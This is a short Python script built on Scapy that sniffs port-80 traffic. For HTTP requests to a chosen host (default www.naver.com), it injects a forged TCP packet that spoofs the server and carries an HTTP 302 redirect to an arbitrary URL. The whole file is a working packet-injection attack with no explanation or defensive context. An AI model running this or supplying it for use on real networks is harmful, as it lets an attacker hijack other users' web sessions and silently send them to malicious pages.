from scapy.all import *

class TCP_HTTP_inject(AnsweringMachine):
    function_name="TCP_HTTP_spoof"
    filter = "tcp port 80"

    def parse_options(self, target_host="www.naver.com", redirect_url='http://en.wikipedia.org/wiki/HTTp_302'):
        self.target_host = target_host
        self.redirect_url = redirect_url

    def is_request(self, req):
        return req.haslayer(Raw) and ("Host: %s" % self.target_host in req.getlayer(Raw).load)

    def make_reply(self, req):		
        ip = req.getlayer(IP)		
        tcp = req.getlayer(TCP)
        http_payload = "HTTP/1.1 302 Found\r\nLocation: %s\r\nContent-Length: 0\r\nConnection: close\r\n\r\n" % self.redirect_url
        resp = IP(dst=ip.src, src=ip.dst) / TCP(dport=ip.sport,sport=ip.dport, flags="PA", seq=tcp.ack, ack=tcp.seq+len(tcp.payload)) / Raw(load=http_payload)	
        return resp


if __name__ == '__main__':
    conf.L3socket = L3RawSocket
TCP_HTTP_inject()()
